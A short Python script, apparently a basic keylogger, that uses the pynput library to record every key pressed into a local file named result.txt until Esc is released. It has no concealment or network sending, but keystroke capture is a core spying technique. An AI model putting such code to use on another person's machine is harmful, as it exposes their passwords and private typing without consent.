from pynput.keyboard import Key, Listener
k = []

def on_press(key):
    k.append(key)
    write_1(k)
    k.clear()

def write_1(var):
    with open("result.txt", "a") as file:
        for i in var:
            new_var = str(i).replace("'", '')
            file.write(new_var)
            file.write(" ")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()